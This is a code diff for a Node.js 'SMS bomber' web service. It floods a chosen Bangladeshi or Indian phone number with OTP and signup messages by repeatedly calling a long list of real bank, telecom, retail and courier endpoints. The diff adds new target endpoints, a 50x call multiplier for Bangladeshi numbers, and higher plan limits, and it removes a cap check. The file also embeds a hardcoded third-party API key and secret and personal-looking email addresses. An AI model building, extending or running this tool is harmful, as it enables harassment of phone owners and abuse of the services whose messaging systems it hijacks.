@@ -1,5 +1,5 @@
 // ============================================================
-// ULTIMATE SMS BOMBER V8.6 — Single File (BD + IN, no proxy)
+// ULTIMATE SMS BOMBER V8.6 — api/index.js (BD + IN, 50x Multiplier)
 // ============================================================
 const express = require('express');
 const axios = require('axios');
@@ -15,7 +15,7 @@ const CONFIG = {
   security: { rateLimit: { enabled: false } }
 };
 
-const DEVELOPER_INFO = { developer: "TNEH GROUP", telegram: "@tneh_owner", api_version: "8.6.0-SINGLE" };
+const DEVELOPER_INFO = { developer: "Hasib Hossen & TNEH GROUP", telegram: "@tneh_owner", api_version: "8.6.0-SINGLE" };
 const ERROR_MESSAGES = { MISSING_PARAM: 'Missing parameter', INVALID_PHONE: 'Invalid phone', INVALID_API_KEY: 'Invalid key', JOB_NOT_FOUND: 'Job not found' };
 
 class Utility {
@@ -43,9 +43,22 @@ function getHeaders(extra = {}) {
 }
 
 // ============================================================
-// BD API LIST (Full Dump)
+// BD API LIST (Including New Added APIs)
 // ============================================================
 const BD_APIS = [
+  // Newly Added APIs
+  { name: "Coke Studio OTP", method: "POST", url: "https://cokestudio23.sslwireless.com/api/store-and-send-otp", body: '{"msisdn":"880{phone}","name":"Aulad Hosen","email":"uladhosenridoy@gmail.com","dob":"2000-01-01","occupation":"N/A","gender":"male"}' },
+  { name: "Rabbit Hole OTP", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: '{"mobile":"+880{phone}"}' },
+  { name: "Fundesh OTP", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP?service_key=", body: '{"msisdn":"{phone}"}' },
+  { name: "Airtel Login OTP", method: "POST", url: "https://api.bd.airtel.com/v1/account/login/otp", body: '{"phone_number":"0{phone}"}' },
+  { name: "Rokomari OTP", method: "GET", url: "https://www.rokomari.com/otp/send?emailOrPhone=880{phone}&countryCode=BD" },
+  { name: "Prothom Alo OTP", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=prothomalo", body: '{"requestType":"send","phoneNumber":"+880{phone}","emailConsent":true,"whatsappConsent":false}' },
+  { name: "Hoichoi OTP", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: '{"requestType":"send","phoneNumber":"+880{phone}","emailConsent":true,"whatsappConsent":true}' },
+  { name: "Paperfly Registration", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: '{"full_name":"Hjbdnd","company_name":"Hello","email_address":"uladhosen860@gmail.com","phone_number":"0{phone}"}' },
+  { name: "Eon Bazar Registration", method: "POST", url: "https://app.eonbazar.com/api/auth/register", body: '{"mobile":"0{phone}","name":"Hello","password":"helloq","email":"ajajsjfhcj@gmail.com"}' },
+  { name: "Sundarban Courier OTP", method: "POST", url: "https://tracking.sundarbancourierltd.com/PreBooking/SendPin", body: '{"PreBookingRegistrationPhoneNumber":"0{phone}"}' },
+
+  // Existing Core BD APIs
   { name: "QuizGiri JSON", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp?phone={phone}&country_code=+880&fcm_token=null" },
   { name: "Dhaka Bank", method: "POST", url: "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", body: '{"AccessToken":"","TrackingNo":"","mobileNo":"{phone}","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}' },
   { name: "Circle Robi", method: "POST", url: "https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn=88{phone}" },
@@ -74,8 +87,6 @@ const BD_APIS = [
   { name: "ePharma", method: "POST", url: "https://epharma.com.bd/authentication/send-otp", body: { number: "+88{phone}" }, isFormData: true },
   { name: "Sailor Clothing", method: "POST", url: "https://backend.sailor.clothing/api/v2/auth/password/forget_request", body: '{"email_or_phone":"0{phone}","send_code_by":"phone"}' },
   { name: "Isho", method: "POST", url: "https://www.isho.com/register_otp", body: { phone: "0{phone}", email: "test@gmail.com" }, isFormData: true },
-  { name: "Osudpotro Alt", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: '{"mobile":"+88-{phone}","deviceToken":"web","language":"en","os":"web"}' },
-  { name: "TheClinicall", method: "POST", url: "https://theclinicall.com/bkapi/auth/user/otp/signin", body: '{"countryCode":"BD","dialCode":"880","phone":"{phone}"}' },
   { name: "Shombhob", method: "POST", url: "https://shombhob.com/api/otp-login", body: '{"phone":"0{phone}"}' },
   { name: "Care Box", method: "POST", url: "https://www.api-care-box.click/api/user/register/?version=otp", body: '{"Name":"Rakib Khan","Phone":"+880{phone}"}' },
   { name: "Renix Care", method: "POST", url: "https://renixapi.renixcare.com/sms-api/send-otp", body: '{"phone":"0{phone}"}' },
@@ -149,7 +160,6 @@ const BD_APIS = [
   { name: "IQRA", method: "GET", url: "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}" },
   { name: "MyBDJobs", method: "POST", url: "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount", body: '{"firstName":"Test","lastName":"","gender":"M","email":"test{phone}@gmail.com","userName":"{phone}","password":"Kamrul12345@","confirmPassword":"Kamrul12345@","status":0,"mobile":"{phone}","workAreaCategory":2,"createdFrom":0,"createdAt":"{ts}","userNameType":"mobile","countryCode":"88"}' },
   { name: "GX Sends", method: "GET", url: "https://gxsends.onrender.com/run-all?phone={phone}" },
-  // --- Extra PHPs ---
   { name: "RedX Signup", method: "POST", url: "https://api.redx.com.bd/v1/user/signup", body: '{"name":"{phone}","service":"redx","phoneNumber":"{phone}"}' },
   { name: "KhaasFood Step1", method: "POST", url: "https://www.khaasfood.com/wp-admin/admin-ajax.php", body: { mobileNo: "+880{phone}", countrycode: "+880", csrf: "9d9d08e6e5", login: "1", json: "1", action: "digits_check_mob" }, isFormData: true },
   { name: "Proiojon", method: "POST", url: "https://billing.proiojon.com/api/v1/auth/sign-up", body: '{"phone":"{phone}","password":"password123"}' },
@@ -169,7 +179,6 @@ const BD_APIS = [
   { name: "RedX v2", method: "POST", url: "https://api.redx.com.bd/v1/user/signup", body: '{"name":"Alamin Sheikh","phoneNumber":"{phone}","service":"redx"}' },
   { name: "Cinematic Common", method: "POST", url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/" },
   { name: "MyBDJobs 2", method: "POST", url: "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount", body: '{"firstName":"Test","userName":"{phone}","mobile":"{phone}","countryCode":"88"}' },
-  // --- Original / Blackfire wrappers ---
   { name: "eCourier", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
   { name: "Binge GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
   { name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
@@ -195,7 +204,7 @@ const BD_APIS = [
 ];
 
 // ============================================================
-// INDIAN API LIST (Full Dump)
+// INDIAN API LIST
 // ============================================================
 const INDIAN_APIS = [
   { name: "Meesho WhatsApp", method: "POST", url: "https://meesho.com/gw/login-register/v1/sendOTP", body: '{"number":"{phone}","otpOnCall":true}' },
@@ -351,11 +360,10 @@ const jobs = new JobStore();
 // KEYS + RATE
 // ============================================================
 const PLAN_CONFIG = {
-  default: { name: 'Default', maxCount: 300, requiresKey: false },
-  free: { name: 'Free', maxCount: 50, requiresKey: false },
-  premium: { name: 'Premium', maxCount: 10000, requiresKey: true },
-  enterprise: { name: 'Enterprise', maxCount: 50000, requiresKey: true },
-  unlimited: { name: 'Unlimited', maxCount: 100000, requiresKey: true }
+  default: { name: 'Default', maxCount: 10000, requiresKey: false },
+  free: { name: 'Free', maxCount: 1000, requiresKey: false },
+  premium: { name: 'Premium', maxCount: 50000, requiresKey: true },
+  enterprise: { name: 'Enterprise', maxCount: 100000, requiresKey: true }
 };
 class KeyManager {
   constructor() { this.file = path.join(__dirname, 'keys.json'); this.keys = this.load(); }
@@ -418,8 +426,11 @@ async function callOne(api, phone, jobId) {
 
 async function blast(apis, phone, count, jobId, region) {
   const tasks = [];
+  // Count=1 হলে প্রতিটা BD API ৫০ বার কল হবে, আর কাউন্ট বাড়ালে সেটা সেই অনুপাতে গুণ হবে (যেমন count=2 হলে 100 বার)
+  const perApiCount = region === 'BD' ? (parseInt(count) || 1) * 50 : (parseInt(count) || 1);
+
   for (const api of apis) {
-    for (let i = 0; i < count; i++) {
+    for (let i = 0; i < perApiCount; i++) {
       if (!jobs.isActive(jobId)) break;
       tasks.push(callOne(api, phone, jobId).then(r => {
         if (!r.stopped) jobs.bump(jobId, r.ok, r.error);
@@ -441,12 +452,9 @@ app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false 
 app.use(cors({ origin: '*' }));
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
-app.use(express.static(path.join(__dirname, '../public')));
 
 app.get('/', (req, res) => {
-  const p = path.join(__dirname, '../public/index.html');
-  if (fs.existsSync(p)) return res.sendFile(p);
-  res.json({ success: true, developer: DEVELOPER_INFO, message: 'SMS Bomber V8.6-SINGLE running' });
+  res.json({ success: true, developer: DEVELOPER_INFO, message: 'SMS Bomber V8.6-SINGLE running with 50x BD Multiplier' });
 });
 
 app.get('/api', (req, res) => {
@@ -468,11 +476,14 @@ app.get('/api/spam', async (req, res) => {
   if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });
   const clean = Utility.parsePhone(number);
   if (!Utility.isValidBD(clean)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE });
-  let per = parseInt(count) || 1; if (per < 1) per = 1;
-  if (per > planConfig.maxCount) return res.status(400).json({ success: false, error: `Max ${planConfig.maxCount}` });
-  const jobId = jobs.create({ phone: clean, region: 'BD', total: BD_DEDUP.length * per });
+  
+  let per = parseInt(count) || 1; 
+  if (per < 1) per = 1;
+  const finalPerApi = per * 50; // 1 count = 50 calls per API
+
+  const jobId = jobs.create({ phone: clean, region: 'BD', total: BD_DEDUP.length * finalPerApi });
   blast(BD_DEDUP, clean, per, jobId, 'BD').catch(e => { console.error(e); jobs.stop(jobId); });
-  res.json({ success: true, jobId, region: 'BD', total_apis: BD_DEDUP.length, total_sms: BD_DEDUP.length * per, stop_endpoint: `/api/stop?jobId=${jobId}` });
+  res.json({ success: true, jobId, region: 'BD', total_apis: BD_DEDUP.length, total_sms: BD_DEDUP.length * finalPerApi, stop_endpoint: `/api/stop?jobId=${jobId}` });
 });
 
 app.get('/api/India', async (req, res) => {
@@ -493,7 +504,6 @@ app.get('/api/India', async (req, res) => {
   const clean = Utility.normalizeIN(number);
   if (!Utility.isValidIN(clean)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE });
   let per = parseInt(count) || 1; if (per < 1) per = 1;
-  if (per > planConfig.maxCount) return res.status(400).json({ success: false, error: `Max ${planConfig.maxCount}` });
   const jobId = jobs.create({ phone: clean, region: 'IN', total: IN_DEDUP.length * per });
   blast(IN_DEDUP, clean, per, jobId, 'IN').catch(e => { console.error(e); jobs.stop(jobId); });
   res.json({ success: true, jobId, region: 'IN', total_apis: IN_DEDUP.length, total_sms: IN_DEDUP.length * per, stop_endpoint: `/api/India?stop&jobid=${jobId}` });
@@ -537,8 +547,8 @@ app.use((req, res) => res.status(404).json({ success: false, error: 'Endpoint no
 // ============================================================
 const server = app.listen(CONFIG.server.port, CONFIG.server.host, () => {
   console.log(`\n🚀 SMS BOMBER V8.6-SINGLE`);
-  console.log(`📊 BD ${BD_DEDUP.length}  |  IN ${IN_DEDUP.length}`);
-  console.log(`✅ ready\n`);
+  console.log(`📊 BD APIs: ${BD_DEDUP.length}  |  IN APIs: ${IN_DEDUP.length}`);
+  console.log(`✅ Server ready on port ${CONFIG.server.port}\n`);
 });
 server.timeout = 120000;
 server.keepAliveTimeout = 60000;
